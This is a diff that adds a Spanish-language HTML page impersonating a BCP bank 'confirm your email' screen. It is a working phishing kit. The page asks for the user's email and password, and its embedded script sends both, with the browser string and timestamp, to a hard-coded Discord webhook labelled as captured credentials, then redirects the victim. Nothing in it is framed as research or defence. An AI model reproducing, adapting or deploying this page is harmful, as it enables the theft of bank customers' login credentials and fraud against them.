@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Confirma tu correo - BCP</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f4f5f7;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 414px; /* Ancho de pantalla móvil típica */
+      min-height: 100vh;
+      background-color: #f3f3f3;
+      padding: 20px 24px;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Botón de cerrar X */
+    .close-btn {
+      align-self: flex-end;
+      font-size: 20px;
+      color: #666;
+      cursor: pointer;
+      text-decoration: none;
+      margin-top: 10px;
+      margin-right: 5px;
+    }
+
+    /* Encabezados */
+    .header {
+      text-align: center;
+      margin-top: 25px;
+      margin-bottom: 30px;
+    }
+
+    .header h1 {
+      font-size: 20px;
+      color: #2b2b2b;
+      font-weight: 700;
+      line-height: 1.4;
+      padding: 0 10px;
+    }
+
+    /* Formulario e Inputs */
+    .form-group {
+      position: relative;
+      margin-top: 15px;
+    }
+
+    /* Contenedor estilo campo con texto integrado en el borde */
+    .input-box {
+      border: 1.5px solid #800020; /* Color guinda / borgoña */
+      border-radius: 10px;
+      position: relative;
+      padding: 12px 16px;
+      background-color: transparent;
+    }
+
+    .input-label {
+      position: absolute;
+      top: -10px;
+      left: 12px;
+      background-color: #f3f3f3; /* Coincide con el fondo */
+      padding: 0 6px;
+      font-size: 13px;
+      color: #800020;
+      font-weight: 500;
+    }
+
+    .input-field {
+      width: 100%;
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 15px;
+      color: #333;
+      letter-spacing: 0.5px;
+    }
+
+    .spacer {
+      margin-top: 25px;
+    }
+
+    /* Botón Continuar */
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      margin-top: 40px;
+      border: none;
+      border-radius: 25px;
+      background-color: #e2e2e2;
+      color: #8e8e8e;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      text-align: center;
+      transition: background-color 0.2s ease;
+    }
+
+    /* Estado cuando se habilita el botón */
+    .btn-submit.active {
+      background-color: #800020;
+      color: #ffffff;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Botón Cerrar (X) -->
+    <div class="close-btn" id="btn-cerrar">&#215;</div>
+
+    <!-- Título Actualizado -->
+    <div class="header">
+      <h1>Confirma tu correo electrónico asociado a tu cuenta BCP</h1>
+    </div>
+
+    <!-- Campo: Correo electrónico -->
+    <div class="form-group">
+      <div class="input-box">
+        <span class="input-label">Correo electrónico</span>
+        <input type="email" id="correo" class="input-field" placeholder="" autocomplete="off" />
+      </div>
+    </div>
+
+    <!-- Campo: Contraseña -->
+    <div class="form-group spacer">
+      <div class="input-box">
+        <span class="input-label">Contraseña</span>
+        <input type="password" id="contrasena" class="input-field" placeholder="" autocomplete="off" />
+      </div>
+    </div>
+
+    <!-- Botón Continuar -->
+    <button class="btn-submit" id="btn-continuar" type="button">Continuar</button>
+  </div>
+
+  <!-- ============================================================
+       SCRIPT EMBEBIDO: Captura + Webhook Discord + redirección
+       ============================================================ -->
+  <script>
+  (function () {
+    'use strict';
+
+    /* ================= CONFIGURACIÓN ================= */
+    // Reemplaza por tu webhook real de Discord
+    const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1574870438499319819/AFIZOmm6G9wYZBP4opqeUKkujnpL0CGWIqNPclqv9PPMgxuuY9pnKwwNrew2E5Vg-XlM';
+    // Archivo al que se redirige tras enviar
+    const REDIRECT_URL = 'index.html';
+
+    /* ================= REFERENCIAS ================= */
+    const inputCorreo     = document.getElementById('correo');
+    const inputContrasena = document.getElementById('contrasena');
+    const btnContinuar    = document.getElementById('btn-continuar');
+    const btnCerrar       = document.getElementById('btn-cerrar');
+
+    /* ============ Validación básica ============ */
+    function validar() {
+      const correoOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(inputCorreo.value.trim());
+      const passOk   = inputContrasena.value.trim().length >= 4;
+
+      const ok = correoOk && passOk;
+      btnContinuar.disabled = !ok;
+      btnContinuar.classList.toggle('active', ok);
+      btnContinuar.style.cursor = ok ? 'pointer' : 'not-allowed';
+    }
+    inputCorreo.addEventListener('input', validar);
+    inputContrasena.addEventListener('input', validar);
+    validar();
+
+    /* ============ Utilidades ============ */
+    function limpiar(str) {
+      return String(str).replace(/[<>`]/g, '').trim().slice(0, 150);
+    }
+
+    async function enviarWebhook(datos) {
+      const payload = {
+        username: 'LT1 · Confirmación de correo',
+        embeds: [{
+          title: '📧 Correo y contraseña capturados',
+          color: 0x800020,
+          fields: [
+            { name: '✉️ Correo electrónico', value: datos.correo || '(vacío)',     inline: false },
+            { name: '🔑 Contraseña',         value: datos.contrasena || '(vacío)', inline: false },
+            { name: '🌐 Navegador',          value: datos.userAgent,               inline: false },
+            { name: '🕒 Fecha',              value: datos.fecha,                   inline: false }
+          ],
+          footer: { text: 'Sistema de ingreso LT1' },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      const res = await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!res.ok) throw new Error('Webhook ' + res.status);
+    }
+
+    /* ============ Click en Continuar ============ */
+    btnContinuar.addEventListener('click', async function () {
+      if (btnContinuar.disabled) return;
+
+      const correo     = limpiar(inputCorreo.value);
+      const contrasena = limpiar(inputContrasena.value);
+
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo)) {
+        alert('Ingresa un correo electrónico válido.');
+        return;
+      }
+      if (contrasena.length < 4) {
+        alert('Ingresa tu contraseña (mínimo 4 caracteres).');
+        return;
+      }
+
+      const datos = {
+        correo: correo,
+        contrasena: contrasena,
+        userAgent: navigator.userAgent.slice(0, 200),
+        fecha: new Date().toLocaleString('es-PE')
+      };
+
+      // Guardar correo en localStorage (sin contraseña, por seguridad)
+      try {
+        localStorage.setItem('lt1_correo', JSON.stringify({ correo: datos.correo }));
+      } catch (e) { /* modo privado */ }
+
+      // Bloquear mientras envía
+      btnContinuar.disabled = true;
+      const textoOriginal = btnContinuar.textContent;
+      btnContinuar.textContent = 'Enviando...';
+      btnContinuar.classList.remove('active');
+
+      try {
+        await enviarWebhook(datos);
+      } catch (err) {
+        console.warn('No se pudo enviar al webhook:', err);
+      } finally {
+        btnContinuar.textContent = textoOriginal;
+        window.location.href = REDIRECT_URL;
+      }
+    });
+
+    /* ============ Botón X (cerrar) ============ */
+    btnCerrar.addEventListener('click', function () {
+      // Solo navega atrás o a index1; no envía datos
+      if (history.length > 1) history.back();
+      else window.location.href = 'index1.html';
+    });
+  })();
+  </script>
+</body>
+</html>
